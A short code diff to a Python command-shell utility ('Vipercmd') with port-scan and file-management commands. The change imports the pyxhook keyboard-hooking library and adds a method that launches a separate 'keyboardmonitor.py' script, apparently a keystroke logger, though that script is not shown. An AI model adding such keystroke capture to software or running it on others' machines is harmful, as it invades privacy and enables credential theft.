@@ -8,6 +8,7 @@ import base64
 import Overwrite
 import commands
 import tc
+import pyxhook
 #import pygame
 from os import listdir
 from os.path import isfile, join
@@ -29,6 +30,9 @@ class Vipercmd(object):
         print('Current list of commands: greet, portscan, honeypot,'
               ' listcd, dirchange, dl, listf, remf, autocleanup, clean_trash, remdir, readf, runf, sechash, b64, exit')
 
+    def keyboard_m(self):
+       os.system('python keyboardmonitor.py')
+       
     #def playmusic(self):
         #Works in Windows.
         #To-do add list.
